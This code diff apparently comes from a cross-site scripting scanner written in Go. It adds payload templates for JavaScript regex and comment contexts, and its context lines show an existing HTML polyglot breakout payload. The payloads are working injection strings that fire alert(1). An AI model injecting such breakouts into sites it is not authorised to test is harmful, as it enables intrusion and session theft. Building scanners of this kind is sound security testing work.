@@ -14,6 +14,14 @@ type PayloadTemplate struct {
 }
 
 var payloadTemplates = map[context.ContextType][]PayloadTemplate{
+	context.ContextJSRegexp: {
+		{Value: `x/;alert(1);//`, Severity: model.High, Desc: "Regex literal breakout"},
+		{Value: `x]/;alert(1);//`, Severity: model.High, Desc: "Regex character-class breakout"},
+	},
+	context.ContextJSComment: {
+		{Value: "\nalert(1);//", Severity: model.High, Desc: "Line comment breakout"},
+		{Value: `*/alert(1);/*`, Severity: model.High, Desc: "Block comment breakout"},
+	},
 	context.ContextHTMLBody: {
 		// Polyglot payload (works across html/attr/js breakout contexts via angle brackets)
 		{Value: `javascript:/*--></title></textarea></style></script></xmp><svg/onload=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: html/attr/js breakout"},
